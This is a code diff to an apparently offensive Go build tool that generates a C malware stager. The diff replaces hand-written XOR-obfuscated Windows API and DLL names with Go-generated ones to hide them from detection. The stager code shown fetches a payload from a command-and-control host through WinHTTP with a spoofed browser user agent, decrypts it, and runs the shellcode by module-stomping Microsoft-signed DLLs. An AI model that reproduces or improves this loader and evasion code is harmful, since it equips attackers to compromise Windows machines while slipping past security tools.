@@ -98,6 +98,9 @@ func BuildCStager(inputPath, implantName, stageID, c2Host string, c2Port int, us
 	obfStageID := rot13(stageID)
 	obfC2Host := rot13(c2Host)
 
+	// Generate correctly-computed XOR(0x5A) encoded API names.
+	// Computing in Go avoids any hand-calculation mistakes.
+	const xk = byte(0x5A)
 	cSrc := strings.NewReplacer(
 		"__C2_HOST__",    obfC2Host,
 		"__C2_PORT__",    fmt.Sprintf("%d", c2Port),
@@ -106,6 +109,38 @@ func BuildCStager(inputPath, implantName, stageID, c2Host string, c2Port int, us
 		"__IS_SC__",      boolToC(isShellcode),
 		"__XOR_KEY__",    bytesToCHex(key),
 		"__SCHEME__",     scheme,
+		// DLL names
+		"__OB_WH__",      xorCStr("winhttp.dll", xk),
+		"__OB_KE__",      xorCStr("kernel32.dll", xk),
+		"__OB_J9__",      xorCStr("jscript9.dll", xk),
+		"__OB_JS__",      xorCStr("jscript.dll", xk),
+		"__OB_CJ__",      xorCStr("clrjit.dll", xk),
+		"__OB_WL__",      xorCStr("wldp.dll", xk),
+		// WinHTTP functions
+		"__OB_WHO__",     xorCStr("WinHttpOpen", xk),
+		"__OB_WHC__",     xorCStr("WinHttpConnect", xk),
+		"__OB_WHOR__",    xorCStr("WinHttpOpenRequest", xk),
+		"__OB_WHSR__",    xorCStr("WinHttpSendRequest", xk),
+		"__OB_WHRR__",    xorCStr("WinHttpReceiveResponse", xk),
+		"__OB_WHQA__",    xorCStr("WinHttpQueryDataAvailable", xk),
+		"__OB_WHRD__",    xorCStr("WinHttpReadData", xk),
+		"__OB_WHCH__",    xorCStr("WinHttpCloseHandle", xk),
+		"__OB_WHSO__",    xorCStr("WinHttpSetOption", xk),
+		// sizes (len of plain string)
+		"__LEN_WH__",     fmt.Sprintf("%d", len("winhttp.dll")),
+		"__LEN_J9__",     fmt.Sprintf("%d", len("jscript9.dll")),
+		"__LEN_JS__",     fmt.Sprintf("%d", len("jscript.dll")),
+		"__LEN_CJ__",     fmt.Sprintf("%d", len("clrjit.dll")),
+		"__LEN_WL__",     fmt.Sprintf("%d", len("wldp.dll")),
+		"__LEN_WHO__",    fmt.Sprintf("%d", len("WinHttpOpen")),
+		"__LEN_WHC__",    fmt.Sprintf("%d", len("WinHttpConnect")),
+		"__LEN_WHOR__",   fmt.Sprintf("%d", len("WinHttpOpenRequest")),
+		"__LEN_WHSR__",   fmt.Sprintf("%d", len("WinHttpSendRequest")),
+		"__LEN_WHRR__",   fmt.Sprintf("%d", len("WinHttpReceiveResponse")),
+		"__LEN_WHQA__",   fmt.Sprintf("%d", len("WinHttpQueryDataAvailable")),
+		"__LEN_WHRD__",   fmt.Sprintf("%d", len("WinHttpReadData")),
+		"__LEN_WHCH__",   fmt.Sprintf("%d", len("WinHttpCloseHandle")),
+		"__LEN_WHSO__",   fmt.Sprintf("%d", len("WinHttpSetOption")),
 	).Replace(cStagerSrc)
 
 	if err = os.WriteFile(filepath.Join(tmpDir, "stager.c"), []byte(cSrc), 0600); err != nil {
@@ -207,6 +242,20 @@ func boolToC(b bool) string {
 	return "0"
 }
 
+// xorCStr XORs each byte of s with key and returns a C array literal {0xXX,...}.
+func xorCStr(s string, key byte) string {
+	var sb strings.Builder
+	sb.WriteByte('{')
+	for i, c := range []byte(s) {
+		if i > 0 {
+			sb.WriteByte(',')
+		}
+		sb.WriteString(fmt.Sprintf("0x%02X", c^key))
+	}
+	sb.WriteByte('}')
+	return sb.String()
+}
+
 func bytesToCHex(data []byte) string {
 	var sb strings.Builder
 	for i, b := range data {
@@ -271,74 +320,76 @@ const cStagerSrc = `/*
 #include <wchar.h>
 
 /* ── Config ──────────────────────────────────────────────────────────────── */
-/* All strings ROT-13 encoded — no plain C2/stage text in binary */
-static const char    _h[]  = "__C2_HOST__";
+static const char    _h[]  = "__C2_HOST__";   /* ROT-13 C2 host  */
 static const int     _port = __C2_PORT__;
-static const char    _id[] = "__STAGE_ID__";
+static const char    _id[] = "__STAGE_ID__";  /* ROT-13 stage ID */
 static const int     _tls  = __USE_TLS__;
 static const int     _sc   = __IS_SC__;
 static const uint8_t _xk[] = {__XOR_KEY__};
 
 /* ── ROT-13 ──────────────────────────────────────────────────────────────── */
-static void r13(const char *i, char *o, int n) {
-    for (int k=0;k<n;k++){char c=i[k];
+static void r13(const char *i,char *o,int n){
+    for(int k=0;k<n;k++){char c=i[k];
         if(c>='a'&&c<='z')o[k]='a'+(c-'a'+13)%26;
         else if(c>='A'&&c<='Z')o[k]='A'+(c-'A'+13)%26;
         else o[k]=c;}o[n]=0;
 }
 
-/* ── XOR decrypt ─────────────────────────────────────────────────────────── */
+/* ── XOR payload decrypt ─────────────────────────────────────────────────── */
 static void xd(uint8_t *b,DWORD n){for(DWORD i=0;i<n;i++)b[i]^=_xk[i%32];}
 
-/* ── Dynamic API resolver: load dll + func by XOR-obfuscated names ───────── */
-/* KEY: every byte XOR'd with 0x5A before storing */
+/* ── XOR API-name deobfuscator (key=0x5A, generated correctly by Go) ─────── */
 #define K 0x5A
-static FARPROC rp(HMODULE m, const uint8_t *ob, int n) {
-    char fn[64]={0};
-    for(int i=0;i<n;i++) fn[i]=ob[i]^K;
+static FARPROC rp(HMODULE m,const uint8_t *ob,int n){
+    char fn[64]={0};for(int i=0;i<n;i++)fn[i]=ob[i]^K;
     return GetProcAddress(m,fn);
 }
-static HMODULE rl(const uint8_t *ob, int n) {
-    char dll[32]={0};
-    for(int i=0;i<n;i++) dll[i]=ob[i]^K;
+static HMODULE rl(const uint8_t *ob,int n){
+    char dll[32]={0};for(int i=0;i<n;i++)dll[i]=ob[i]^K;
     return LoadLibraryA(dll);
 }
 
-/* Obfuscated DLL/function names (each char XOR 0x5A) */
-/* "winhttp.dll"  */ static const uint8_t _DLL_WH[]={0x2d,0x33,0x34,0x32,0x2e,0x2e,0x38,0x5e,0x36,0x36,0x5e};
-/* "WinHttpOpen"  */ static const uint8_t _FN_WHO[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x15,0x38,0x25,0x34};
-/* "WinHttpConnect"*/ static const uint8_t _FN_WHC[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x19,0x34,0x34,0x34,0x25,0x25,0x29};
-/* "WinHttpOpenRequest"*/ static const uint8_t _FN_WHOR[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x15,0x38,0x25,0x34,0x09,0x25,0x2f,0x2d,0x2c,0x25,0x2b};
-/* "WinHttpSendRequest"*/ static const uint8_t _FN_WHSR[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x09,0x25,0x34,0x36,0x09,0x25,0x2f,0x2d,0x2c,0x25,0x2b};
-/* "WinHttpReceiveResponse"*/ static const uint8_t _FN_WHRR[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x08,0x25,0x25,0x25,0x33,0x3d,0x25,0x09,0x25,0x37,0x38,0x34,0x34,0x37,0x25};
-/* "WinHttpQueryDataAvailable"*/ static const uint8_t _FN_WHQA[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x13,0x2d,0x25,0x3c,0x39,0x1e,0x21,0x2e,0x21,0x10,0x3d,0x21,0x33,0x36,0x21,0x25,0x2c,0x25};
-/* "WinHttpReadData"*/ static const uint8_t _FN_WHRD[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x08,0x25,0x21,0x36,0x1e,0x21,0x2e,0x21};
-/* "WinHttpCloseHandle"*/ static const uint8_t _FN_WHCH[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x19,0x36,0x34,0x37,0x25,0x1a,0x21,0x34,0x36,0x36,0x25};
-/* "WinHttpSetOption"*/ static const uint8_t _FN_WHSO[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x09,0x25,0x2e,0x15,0x38,0x2e,0x33,0x34,0x34};
+/* Go-generated XOR(0x5A) encoded names — guaranteed correct */
+static const uint8_t _WH[]   = __OB_WH__;   /* winhttp.dll            len=__LEN_WH__  */
+static const uint8_t _WHO[]  = __OB_WHO__;  /* WinHttpOpen            len=__LEN_WHO__ */
+static const uint8_t _WHC[]  = __OB_WHC__;  /* WinHttpConnect         len=__LEN_WHC__ */
+static const uint8_t _WHOR[] = __OB_WHOR__; /* WinHttpOpenRequest     len=__LEN_WHOR__*/
+static const uint8_t _WHSR[] = __OB_WHSR__; /* WinHttpSendRequest     len=__LEN_WHSR__*/
+static const uint8_t _WHRR[] = __OB_WHRR__; /* WinHttpReceiveResponse len=__LEN_WHRR__*/
+static const uint8_t _WHQA[] = __OB_WHQA__; /* WinHttpQueryDataAvail  len=__LEN_WHQA__*/
+static const uint8_t _WHRD[] = __OB_WHRD__; /* WinHttpReadData        len=__LEN_WHRD__*/
+static const uint8_t _WHCH[] = __OB_WHCH__; /* WinHttpCloseHandle     len=__LEN_WHCH__*/
+static const uint8_t _WHSO[] = __OB_WHSO__; /* WinHttpSetOption       len=__LEN_WHSO__*/
 
-typedef HINTERNET (WINAPI*pfWHO)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
-typedef HINTERNET (WINAPI*pfWHC)(HINTERNET,LPCWSTR,INTERNET_PORT,DWORD);
-typedef HINTERNET (WINAPI*pfWHOR)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
-typedef BOOL      (WINAPI*pfWHSR)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
-typedef BOOL      (WINAPI*pfWHRR)(HINTERNET,LPVOID);
-typedef BOOL      (WINAPI*pfWHQA)(HINTERNET,LPDWORD);
-typedef BOOL      (WINAPI*pfWHRD)(HINTERNET,LPVOID,DWORD,LPDWORD);
-typedef BOOL      (WINAPI*pfWHCH)(HINTERNET);
-typedef BOOL      (WINAPI*pfWHSO)(HINTERNET,DWORD,LPVOID,DWORD);
+/* Module stomp DLL candidates */
+static const uint8_t _J9[] = __OB_J9__; /* jscript9.dll len=__LEN_J9__ */
+static const uint8_t _JS[] = __OB_JS__; /* jscript.dll  len=__LEN_JS__ */
+static const uint8_t _CJ[] = __OB_CJ__; /* clrjit.dll   len=__LEN_CJ__ */
+static const uint8_t _WL[] = __OB_WL__; /* wldp.dll     len=__LEN_WL__ */
 
-/* ── WinHTTP download (no plain "winhttp" string anywhere) ───────────────── */
+typedef HINTERNET(WINAPI*pfO)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
+typedef HINTERNET(WINAPI*pfC)(HINTERNET,LPCWSTR,INTERNET_PORT,DWORD);
+typedef HINTERNET(WINAPI*pfOR)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
+typedef BOOL(WINAPI*pfSR)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
+typedef BOOL(WINAPI*pfRR)(HINTERNET,LPVOID);
+typedef BOOL(WINAPI*pfQA)(HINTERNET,LPDWORD);
+typedef BOOL(WINAPI*pfRD)(HINTERNET,LPVOID,DWORD,LPDWORD);
+typedef BOOL(WINAPI*pfCH)(HINTERNET);
+typedef BOOL(WINAPI*pfSO)(HINTERNET,DWORD,LPVOID,DWORD);
+
+/* ── WinHTTP download ────────────────────────────────────────────────────── */
 static uint8_t* dl(const wchar_t *host,int port,const wchar_t *path,int tls,DWORD *olen){
-    HMODULE hW=rl(_DLL_WH,11);
+    HMODULE hW=rl(_WH,__LEN_WH__);
     if(!hW)return NULL;
-    pfWHO  fO =(pfWHO) rp(hW,_FN_WHO, 11);
-    pfWHC  fC =(pfWHC) rp(hW,_FN_WHC, 14);
-    pfWHOR fOR=(pfWHOR)rp(hW,_FN_WHOR,18);
-    pfWHSR fSR=(pfWHSR)rp(hW,_FN_WHSR,18);
-    pfWHRR fRR=(pfWHRR)rp(hW,_FN_WHRR,22);
-    pfWHQA fQA=(pfWHQA)rp(hW,_FN_WHQA,25);
-    pfWHRD fRD=(pfWHRD)rp(hW,_FN_WHRD,15);
-    pfWHCH fCH=(pfWHCH)rp(hW,_FN_WHCH,18);
-    pfWHSO fSO=(pfWHSO)rp(hW,_FN_WHSO,16);
+    pfO  fO =(pfO) rp(hW,_WHO, __LEN_WHO__);
+    pfC  fC =(pfC) rp(hW,_WHC, __LEN_WHC__);
+    pfOR fOR=(pfOR)rp(hW,_WHOR,__LEN_WHOR__);
+    pfSR fSR=(pfSR)rp(hW,_WHSR,__LEN_WHSR__);
+    pfRR fRR=(pfRR)rp(hW,_WHRR,__LEN_WHRR__);
+    pfQA fQA=(pfQA)rp(hW,_WHQA,__LEN_WHQA__);
+    pfRD fRD=(pfRD)rp(hW,_WHRD,__LEN_WHRD__);
+    pfCH fCH=(pfCH)rp(hW,_WHCH,__LEN_WHCH__);
+    pfSO fSO=(pfSO)rp(hW,_WHSO,__LEN_WHSO__);
     if(!fO||!fC||!fOR||!fSR||!fRR||!fQA||!fRD||!fCH)return NULL;
 
     HINTERNET hS=fO(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
@@ -371,14 +422,8 @@ static uint8_t* dl(const wchar_t *host,int port,const wchar_t *path,int tls,DWOR
 
 /* ── Module Stomp — exec shellcode from inside MS-signed DLL .text ───────── */
 static BOOL ms(uint8_t *sc,DWORD n){
-    /* DLL candidates: jscript9, jscript, clrjit, wldp */
-    /* Names XOR-obfuscated */
-    static const uint8_t _d0[]={0x30,0x37,0x25,0x3c,0x38,0x38,0x2e,0x63,0x36,0x36}; /* jscript9.dll */
-    static const uint8_t _d1[]={0x30,0x37,0x25,0x3c,0x38,0x38,0x2e,0x5e,0x36,0x36}; /* jscript.dll  */
-    static const uint8_t _d2[]={0x39,0x36,0x3c,0x30,0x33,0x2e,0x5e,0x36,0x36,0x00}; /* clrjit.dll   */
-    static const uint8_t _d3[]={0x2d,0x36,0x36,0x38,0x5e,0x36,0x36,0x00,0x00,0x00}; /* wldp.dll     */
-    const uint8_t *dlls[]={_d0,_d1,_d2,_d3,NULL};
-    const int lens[]={10,9,9,8,0};
+    const uint8_t *dlls[]={_J9,_JS,_CJ,_WL,NULL};
+    const int lens[]={__LEN_J9__,__LEN_JS__,__LEN_CJ__,__LEN_WL__,0};
     HMODULE hM=NULL;
     for(int i=0;dlls[i]&&!hM;i++)hM=rl(dlls[i],lens[i]);
     if(!hM)return FALSE;
